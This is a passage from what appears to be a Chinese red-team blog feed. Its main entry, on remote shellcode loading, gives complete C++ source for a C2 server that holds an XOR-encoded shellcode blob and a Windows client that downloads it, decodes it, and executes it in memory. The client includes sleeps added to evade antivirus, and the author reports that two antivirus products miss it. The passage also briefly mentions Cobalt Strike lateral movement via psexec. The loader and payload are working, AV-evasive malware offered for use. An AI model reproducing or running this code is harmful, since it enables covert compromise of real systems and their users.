href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/80fc1a27-bcad-4ce4-964b-b826df97b771.png"></a></p><p>使用psexec横向移动，选择listener为stinger，成功上线</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d324ea94-6ba5-404e-9659-a4dd33c33d5d.png"></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="http://blog.leanote.com/post/snowming/2ec80f7823e0">Cobalt Strike Listener with Proxy          </a></p><p><a href="https://mp.weixin.qq.com/s/45AKbRS677fxynKW6Qfz7w">红队攻防实践：不出网主机搭建内网隧道新思路</a></p><p><a href="https://blog.csdn.net/qq_41874930/article/details/107840269">dns与smb beacon详解与一种内网穿透方法的实践</a></p><p><a href="https://www.freebuf.com/articles/web/247287.html">内网渗透：不出网渗透技巧</a><a href="https://www.freebuf.com/articles/web/247287.html">https://www.freebuf.com/articles/web/247287.html</a>)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>利用SOCKET分离shellcode</title>
    <link href="/2020/12/13/%E5%88%A9%E7%94%A8SOCKET%E5%88%86%E7%A6%BBshellcode/"/>
    <url>/2020/12/13/%E5%88%A9%E7%94%A8SOCKET%E5%88%86%E7%A6%BBshellcode/</url>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>客户端运行后向服务端发起请求接收xor运算后的shellcode还原后执行，达到远程加载shellcode的目的，与stager的功能有些类似。</p><h2 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>)</span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> BUF_SIZE = <span class="hljs-number">1024</span>;<br>WSADATA         wsd;            <span class="hljs-comment">//WSADATA变量</span><br>SOCKET          sServer;        <span class="hljs-comment">//服务器套接字</span><br>SOCKET          sClient;        <span class="hljs-comment">//客户端套接字</span><br>SOCKADDR_IN     addrServ;;      <span class="hljs-comment">//服务器地址</span><br><span class="hljs-keyword">char</span>            buf[BUF_SIZE];  <span class="hljs-comment">//接收数据缓冲区</span><br><span class="hljs-keyword">char</span>sendBuf[] = <span class="hljs-string">&quot;\x6b\xdf\x14\x73\x67\x7f\x5f\x97\x97\x97\xd6\xc6\xd6\xc7\xc5\xc6\xc1\xdf\xa6\x45\xf2\xdf\x1c\xc5\xf7\xdf\x1c\xc5\x8f\xdf\x1c\xc5\xb7\xdf\x1c\xe5\xc7\xdf\x98\x20\xdd\xdd\xda\xa6\x5e\xdf\xa6\x57\x3b\xab\xf6\xeb\x95\xbb\xb7\xd6\x56\x5e\x9a\xd6\x96\x56\x75\x7a\xc5\xd6\xc6\xdf\x1c\xc5\xb7\x1c\xd5\xab\xdf\x96\x47\xf1\x16\xef\x8f\x9c\x95\xe2\xe5\x1c\x17\x1f\x97\x97\x97\xdf\x12\x57\xe3\xf0\xdf\x96\x47\xc7\x1c\xdf\x8f\xd3\x1c\xd7\xb7\xde\x96\x47\x74\xc1\xdf\x68\x5e\xd6\x1c\xa3\x1f\xdf\x96\x41\xda\xa6\x5e\xdf\xa6\x57\x3b\xd6\x56\x5e\x9a\xd6\x96\x56\xaf\x77\xe2\x66\xdb\x94\xdb\xb3\x9f\xd2\xae\x46\xe2\x4f\xcf\xd3\x1c\xd7\xb3\xde\x96\x47\xf1\xd6\x1c\x9b\xdf\xd3\x1c\xd7\x8b\xde\x96\x47\xd6\x1c\x93\x1f\xdf\x96\x47\xd6\xcf\xd6\xcf\xc9\xce\xcd\xd6\xcf\xd6\xce\xd6\xcd\xdf\x14\x7b\xb7\xd6\xc5\x68\x77\xcf\xd6\xce\xcd\xdf\x1c\x85\x7e\xd8\x68\x68\x68\xca\xfd\x97\xde\x29\xe0\xfe\xf9\xfe\xf9\xf2\xe3\x97\xd6\xc1\xde\x1e\x71\xdb\x1e\x66\xd6\x2d\xdb\xe0\xb1\x90\x68\x42\xdf\xa6\x5e\xdf\xa6\x45\xda\xa6\x57\xda\xa6\x5e\xd6\xc7\xd6\xc7\xd6\x2d\xad\xc1\xee\x30\x68\x42\x7c\xe4\xcd\xdf\x1e\x56\xd6\x2f\xc7\x97\x97\x97\xda\xa6\x5e\xd6\xc6\xd6\xc6\xfd\x94\xd6\xc6\xd6\x2d\xc0\x1e\x08\x51\x68\x42\x7c\xce\xcc\xdf\x1e\x56\xdf\xa6\x45\xde\x1e\x4f\xda\xa6\x5e\xc5\xff\x97\x95\xd7\x13\xc5\xc5\xd6\x2d\x7c\xc2\xb9\xac\x68\x42\xdf\x1e\x51\xdf\x14\x54\xc7\xfd\x9d\xc8\xdf\x1e\x66\xdf\x1e\x4d\xde\x50\x57\x68\x68\x68\x68\xda\xa6\x5e\xc5\xc5\xd6\x2d\xba\x91\x8f\xec\x68\x42\x12\x57\x98\x12\x0a\x96\x97\x97\xdf\x68\x58\x98\x13\x1b\x96\x97\x97\x7c\x44\x7e\x73\x96\x97\x97\x7f\x35\x68\x68\x68\xb8\xff\xd3\xd9\xf4\x97\x9b\x88\x75\x09\xbe\x35\xdc\xd7\x35\x98\xd0\x2d\xbe\xa9\x5b\x83\x00\xa1\xc6\x5a\xa4\x4c\xbd\xd2\x20\xcc\x66\x45\x97\x24\xda\x15\x40\x32\xe1\xb7\x8c\xa2\xfa\xa2\xa0\x20\x67\x69\x1c\x02\xe1\x54\x4e\x8a\x79\x2c\xf0\xa7\x4b\x7d\xd5\xb9\x3d\xee\x1a\x4a\xf5\xa7\x74\x8d\x66\xed\x9a\x43\xf5\x3f\x5a\x97\xc2\xe4\xf2\xe5\xba\xd6\xf0\xf2\xf9\xe3\xad\xb7\xda\xf8\xed\xfe\xfb\xfb\xf6\xb8\xa3\xb9\xa7\xb7\xbf\xf4\xf8\xfa\xe7\xf6\xe3\xfe\xf5\xfb\xf2\xac\xb7\xda\xc4\xde\xd2\xb7\xaf\xb9\xa7\xac\xb7\xc0\xfe\xf9\xf3\xf8\xe0\xe4\xb7\xd9\xc3\xb7\xa2\xb9\xa6\xac\xb7\xc3\xe5\xfe\xf3\xf2\xf9\xe3\xb8\xa3\xb9\xa7\xac\xb7\xb9\xd9\xd2\xc3\xb7\xd4\xdb\xc5\xb7\xa6\xb9\xa6\xb9\xa3\xa4\xa5\xa5\xac\xb7\xd5\xd8\xde\xd2\xaf\xac\xd2\xd9\xc2\xc4\xbe\x9a\x9d\x97\xba\x40\x2a\xb6\xce\x2c\x01\xae\x0c\x64\x70\x02\xfb\xbf\x3b\x14\x9d\x54\xb9\x76\xe2\x9c\x2a\x5d\x28\x08\x2f\xcd\x21\x52\x5c\x57\xe0\xfd\x14\x8a\x95\xaf\x66\xc1\x23\x70\x97\xe4\xb2\xd6\xf7\xd0\x3a\xf6\xf7\xcd\x87\x96\xb2\x0f\xef\x11\x6b\x1c\x22\x4d\xc4\xed\x65\xce\x0a\xab\x30\x94\xd2\xdc\x8d\xbf\x3a\xa6\xc9\xe0\x5e\x93\x89\x10\x47\xfa\x96\xac\xb7\x70\xdd\x93\x41\x7b\x62\x5d\x35\xe1\x35\x8b\x4a\x50\x07\x38\x1f\xb8\x10\x92\xe0\x08\xcb\xdb\x79\x8c\xbe\x94\xcb\xc0\xb2\x70\x70\xac\x36\xbd\x83\x76\x46\xde\xfc\x4a\xac\x0b\x30\x69\x57\x05\x69\xac\x1f\xec\xba\x09\x8f\x62\xe8\x4f\xcd\xe2\x35\x07\xbe\xab\xaf\x7c\x64\x8a\x01\xf5\x92\xe2\x9c\xda\x28\x7f\xd5\xc3\x0d\xa3\x8f\x8b\x97\x63\x34\xfa\x7e\xe9\xd7\x5e\x5b\x7b\xb5\xb3\x47\xa8\xe3\x8f\x37\xd0\x2a\x30\xb1\xc0\x32\xe8\xd9\x53\x97\xd6\x29\x67\x22\x35\xc1\x68\x42\xdf\xa6\x5e\x2d\x97\x97\xd7\x97\xd6\x2f\x97\x87\x97\x97\xd6\x2e\xd7\x97\x97\x97\xd6\x2d\xcf\x33\xc4\x72\x68\x42\xdf\x04\xc4\xc4\xdf\x1e\x70\xdf\x1e\x66\xdf\x1e\x4d\xd6\x2f\x97\xb7\x97\x97\xde\x1e\x6e\xd6\x2d\x85\x01\x1e\x75\x68\x42\xdf\x14\x53\xb7\x12\x57\xe3\x21\xf1\x1c\x90\xdf\x96\x54\x12\x57\xe2\x40\xcf\xcf\xcf\xdf\x92\x97\x97\x97\x97\xc7\x54\x7f\x08\x6a\x68\x68\xa6\xae\xa5\xb9\xa6\xa1\xaf\xb9\xa6\xa6\xa6\xb9\xa6\xa4\xa7\x97\x85\xa3\xc1\xef&quot;</span>;<br><span class="hljs-keyword">int</span>             retVal;         <span class="hljs-comment">//返回值</span><br><br><span class="hljs-keyword">if</span> (argc &lt;= <span class="hljs-number">1</span>) &#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;USAGE: server.exe &lt;Listen Port&gt;&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsd) != <span class="hljs-number">0</span>)<span class="hljs-comment">//初始化套结字动态库</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;WSAStartup failed!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">//创建套接字</span><br>sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br><span class="hljs-keyword">if</span> (INVALID_SOCKET == sServer)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Socket Failed!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>WSACleanup();<span class="hljs-comment">//释放套接字资源;</span><br><span class="hljs-keyword">return</span>  <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">//服务器套接字地址</span><br>addrServ.sin_family = AF_INET;<br>addrServ.sin_port = htons((<span class="hljs-keyword">short</span>)atoi(argv[<span class="hljs-number">1</span>]));;<br>addrServ.sin_addr.s_addr = htonl(INADDR_ANY);<br><br><span class="hljs-comment">//绑定套接字</span><br>retVal = bind(sServer, (LPSOCKADDR)&amp;addrServ, <span class="hljs-keyword">sizeof</span>(SOCKADDR_IN));<br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Bind Failed!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>closesocket(sServer);   <span class="hljs-comment">//关闭套接字</span><br>WSACleanup();           <span class="hljs-comment">//释放套接字资源;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">//开始监听 </span><br>retVal = listen(sServer, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Listen Failed!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>closesocket(sServer);   <span class="hljs-comment">//关闭套接字</span><br>WSACleanup();           <span class="hljs-comment">//释放套接字资源;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;开始监听中....&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br><span class="hljs-comment">//接受客户端请求</span><br>sockaddr_in addrClient;<br><span class="hljs-keyword">int</span> addrClientlen = <span class="hljs-keyword">sizeof</span>(addrClient);<br>sClient = accept(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen); <span class="hljs-comment">// 生成对应当前客户端连接的套接字sClient</span><br><span class="hljs-keyword">if</span> (INVALID_SOCKET == sClient)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Accept Failed!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>closesocket(sServer);   <span class="hljs-comment">//关闭套接字</span><br>WSACleanup();           <span class="hljs-comment">//释放套接字资源;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-keyword">int</span> flag = <span class="hljs-number">1</span>; <span class="hljs-comment">//只接收一次</span><br><span class="hljs-keyword">while</span> (flag)<br>&#123;<br><span class="hljs-comment">//接收客户端数据</span><br>ZeroMemory(buf, BUF_SIZE); <span class="hljs-comment">// 填充为0 防止内存分配发生意外</span><br><br>retVal = recv(sClient, buf, BUF_SIZE, <span class="hljs-number">0</span>); <span class="hljs-comment">// 接收数据放在buf缓冲区</span><br><br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal) <span class="hljs-comment">//判断是否接收错误</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Recv Failed!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>closesocket(sServer);   <span class="hljs-comment">//关闭套接字</span><br>closesocket(sClient);   <span class="hljs-comment">//关闭套接字     </span><br>WSACleanup();           <span class="hljs-comment">//释放套接字资源;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;成功建立通信&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>send(sClient, sendBuf, <span class="hljs-keyword">sizeof</span>(sendBuf), <span class="hljs-number">0</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;向客户端发送shellcode...&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;发送shellcode成功!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>flag = <span class="hljs-number">0</span>;<br><br>&#125;<br><span class="hljs-comment">//退出</span><br>closesocket(sServer);   <span class="hljs-comment">//关闭套接字</span><br>closesocket(sClient);   <span class="hljs-comment">//关闭套接字</span><br>WSACleanup();           <span class="hljs-comment">//释放套接字资源;</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>)  <span class="hljs-comment">//添加ws2_32动态库</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(disable:4996) <span class="hljs-comment">//忽略旧函数使用的警告</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> BUF_SIZE = <span class="hljs-number">1024</span>;<br><br>WSADATAwsd; <span class="hljs-comment">//WSADATA变量</span><br>SOCKETsHost; <span class="hljs-comment">// 服务器套接字socket</span><br>SOCKADDR_INservAddr; <span class="hljs-comment">//服务器地址</span><br><span class="hljs-keyword">char</span>buf[BUF_SIZE]; <span class="hljs-comment">// 存放发送的数据缓冲区</span><br><span class="hljs-keyword">char</span>bufRecv[BUF_SIZE]; <span class="hljs-comment">//接收收到的数据缓冲区</span><br>DWORDdwThreadId;<br>HANDLEhThread;<br>DWORDdwOldProtect;<br><br><span class="hljs-keyword">int</span> retVal; <span class="hljs-comment">// 返回值</span><br><br><span class="hljs-keyword">if</span> (argc &lt;= <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;USAGE: client.exe &lt;Server IP&gt; &lt;Server PORT&gt;&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsd) != <span class="hljs-number">0</span>) <span class="hljs-comment">//初始化套结字动态库</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;WSAStartup failed!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br>sHost = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>); <span class="hljs-comment">//创建套接字 IPV4  可靠的，双向的类型服务提供商选择</span><br><span class="hljs-keyword">if</span> (INVALID_SOCKET == sHost)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;socket failed!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>WSACleanup();<br><span class="hljs-keyword">return</span>  <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">//设置服务器的地址</span><br>servAddr.sin_family = AF_INET; <span class="hljs-comment">//指定IPV4</span><br>servAddr.sin_addr.s_addr = inet_addr(argv[<span class="hljs-number">1</span>]); <span class="hljs-comment">// 指定服务器的地址</span><br>servAddr.sin_port = htons((<span class="hljs-keyword">short</span>)atoi(argv[<span class="hljs-number">2</span>])); <span class="hljs-comment">// 指定服务器的端口</span><br><br><br><br>retVal = connect(sHost, (LPSOCKADDR)&amp;servAddr, <span class="hljs-keyword">sizeof</span>(servAddr)); <span class="hljs-comment">// 套接字 sockaddr的指针，也就是地址 第三个参数为SOCKADDR_IN结构体的大小</span><br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal) <span class="hljs-comment">//判断是否连接成功</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;connect failed!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>closesocket(sHost);<br>WSACleanup();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>ZeroMemory(buf, BUF_SIZE); <span class="hljs-comment">// buf指向的地址用0来填充</span><br><span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;ok&quot;</span>); <span class="hljs-comment">//给ok两个字节的字符串复制给buf区段</span><br><br>retVal = send(sHost, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>); <span class="hljs-comment">//send的返回值</span><br><br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal) <span class="hljs-comment">//判断是否发送成功</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;send failed!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>closesocket(sHost);<br>WSACleanup();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Starting Download Payload&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>ZeroMemory(bufRecv, BUF_SIZE); <span class="hljs-comment">// bufRevc指向的地址用0来填充</span><br>Sleep(<span class="hljs-number">2000</span>); <span class="hljs-comment">//延迟两秒起到免杀绕过的效果</span><br><br><br>recv(sHost, bufRecv, BUF_SIZE, <span class="hljs-number">0</span>); <span class="hljs-comment">//bufRecv缓冲区接收 服务端发送来的数据</span><br><br>Sleep(<span class="hljs-number">4000</span>);<br>closesocket(sHost);<br>WSACleanup();<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(bufRecv); i++) &#123; <span class="hljs-comment">//采取倾旋的方式来进行异或解密</span><br><span class="hljs-comment">//Sleep(50);</span><br>_InterlockedXor8(bufRecv + i, <span class="hljs-number">0x97</span>);<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;加载shellcode中&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br><span class="hljs-comment">//下面就是开辟内存存储shellcode 创建线程进行执行</span><br><span class="hljs-keyword">char</span>* shellcode = (<span class="hljs-keyword">char</span>*)VirtualAlloc(<br><span class="hljs-literal">NULL</span>,<br>BUF_SIZE,<br>MEM_COMMIT,<br>PAGE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br>);<br><br>CopyMemory(shellcode, bufRecv, BUF_SIZE);<br>VirtualProtect(shellcode, BUF_SIZE, PAGE_EXECUTE, &amp;dwOldProtect); <span class="hljs-comment">// VirtualProtect改变它的属性 -&gt; 可执行</span><br><br>hThread = CreateThread(<br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>(LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>&amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>);<br><br>WaitForSingleObject(hThread, INFINITE);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在c2上运行服务端</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/4f8be20b-8018-418a-89f9-cf48d4f24798.PNG" alt="imgbed.cn图床"></a></p><p>在目标机器上执行客户端文件,联网情况下火绒和360不查杀</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/6dd0da7e-effb-4afa-b0ab-c5a7a5483302.PNG" alt="imgbed.cn图床"></a></p><p>成功上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/ffa22ff5-65bd-489f-a3af-365d2939d8d9.png" alt="imgbed.cn图床"></a></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.cnblogs.com/zpchcbd/p/12170851.html">https://www.cnblogs.com/zpchcbd/p/12170851.html</a></p><p><a href="https://payloads.online/archivers/2019-11-10/5">https://payloads.online/archivers/2019-11-10/5</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DLL代理加载shellcode实践</title>
    <link href="/2020/12/06/DLL%E4%BB%A3%E7%90%86%E5%8A%A0%E8%BD%BDshellcode%E5%AE%9E%E8%B7%B5/"/>
    <url>/2020/12/06/DLL%E4%BB%A3%E7%90%86%E5%8A%A0%E8%BD%BDshellcode%E5%AE%9E%E8%B7%B5/</url>
    
